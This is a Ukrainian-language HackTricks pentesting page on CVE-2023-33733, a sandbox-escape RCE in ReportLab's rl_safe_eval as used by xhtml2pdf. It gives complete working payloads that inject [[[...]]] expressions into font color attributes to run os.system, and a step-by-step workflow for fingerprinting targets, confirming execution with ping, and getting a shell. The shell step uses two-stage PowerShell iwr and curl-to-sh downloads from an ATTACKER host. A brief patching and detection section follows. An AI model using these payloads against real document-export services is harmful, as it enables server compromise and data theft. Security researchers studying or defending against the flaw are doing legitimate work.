# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

Ця сторінка документує практичний sandbox escape та RCE-примітив у ReportLab’s rl_safe_eval, який використовується xhtml2pdf та іншими PDF-генеруючими конвеєрами при рендерінгу HTML, керованого користувачем, у PDF.

CVE-2023-33733 впливає на версії ReportLab до та включно 3.6.12. У певних контекстах атрибутів (наприклад color) значення, загорнуті в потрійні дужки [[[ ... ]]], оцінюються серверною стороною за допомогою rl_safe_eval. Під час побудови payload, що pivot-ить від дозволеного builtin (pow) до його Python function globals, атакуючий може дістатися до модуля os і виконати команди.

Ключові моменти
- Trigger: inject [[[ ... ]]] into evaluated attributes such as <font color="..."> within markup parsed by ReportLab/xhtml2pdf.
- Sandbox: rl_safe_eval replaces dangerous builtins but evaluated functions still expose __globals__.
- Bypass: craft a transient class Word to bypass rl_safe_eval name checks and access the string "__globals__" while avoiding blocked dunder filtering.
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stability: Return a valid value for the attribute after execution (for color, use and 'red').

Коли тестувати
- Застосунки, які надають експорт HTML→PDF (профілі, інвойси, звіти) і показують xhtml2pdf/ReportLab у метаданих PDF або коментарях HTTP-відповіді.
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- HTTP-відповідь для PDF часто починається з ReportLab generator comment

Як працює обхід sandbox
- rl_safe_eval видаляє або замінює багато builtins (getattr, type, pow, ...) і застосовує фільтрацію імен, щоб відхилити атрибути, що починаються з __ або є в denylist.
- Однак безпечні функції зберігають свої globals у словнику, доступному як func.__globals__.
- Використайте type(type(1)) щоб відновити справжню вбудовану функцію type (обхід обгортки ReportLab), потім визначте клас Word, похідний від str, з модифікованою поведінкою порівняння так, щоб:
  - .startswith('__') → завжди False (обхід перевірки name startswith('__'))
  - .__eq__ повертає False тільки при першому порівнянні (обхід перевірок належності denylist) і True після цього (щоб getattr працював)
  - .__hash__ дорівнює hash(str(self))
- З таким підходом getattr(pow, Word('__globals__')) повертає globals-словник обгорнутого pow, який включає імпортований модуль os. Далі: ['os'].system('<cmd>').

Мінімальний шаблон експлуатації (приклад для атрибуту)
Помістіть payload всередину оціненого атрибуту та переконайтеся, що він повертає допустиме значення атрибуту через булеву операцію і 'red'.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- Форма з list-comprehension дозволяє один вираз, прийнятний для rl_safe_eval.
- Закінчення and 'red' повертає дійсний CSS-колір, щоб рендеринг не ламався.
- Замініть команду за потреби; використовуйте ping щоб валідувати виконання через tcpdump.

Операційний робочий процес
1) Визначити генератор PDF
- PDF Producer показує xhtml2pdf; HTTP-відповідь містить ReportLab comment.
2) Знайти введення, відображене в PDF (наприклад bio/description у профілі) і викликати експорт.
3) Підтвердити виконання низькошумним ICMP
- Запуск: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows часто надсилає рівно чотири echo-запити за замовчуванням.
4) Отримати shell
- Для Windows надійний двоетапний підхід уникає проблем з цитуванням/кодуванням:
- Stage 1 (download):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (execute):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Для Linux-цілей можливий схожий двоетапний підхід з curl/wget:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Примітки та поради
- Контексти атрибутів: color — відомий оцінюваний атрибут; інші атрибути у ReportLab-розмітці також можуть оцінювати expressions. Якщо одне місце санітізується, спробуйте інші ділянки, які рендеряться в потоці PDF (різні поля, стилі таблиць тощо).
- Квотування: тримайте команди компактними. Двоетапні завантаження значно зменшують проблеми з цитуванням та екрануванням.
- Надійність: якщо експорт кешується або ставиться в чергу, трохи варіюйте payload (наприклад випадковий шлях або query) щоб уникнути кешування.

Захист та виявлення
- Оновіть ReportLab до 3.6.13 або пізнішої версії (CVE-2023-33733 виправлено). Відстежуйте також security advisories у пакетах дистрибутивів.
- Не передавайте HTML/розмітку під контролем користувача напряму в xhtml2pdf/ReportLab без суворої санітизації. Видаліть/заблокуйте [[[...]]] evaluation constructs та vendor-specific теги, коли вхідні дані недовірені.
- Розгляньте відключення або обгортання використання rl_safe_eval повністю для недовірених входів.
- Моніторте підозрілі вихідні з’єднання під час генерації PDF (наприклад ICMP/HTTP з app server-ів під час експорту документів).

References
- PoC and technical analysis: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (real-world exploitation, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD entry (affected versions): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
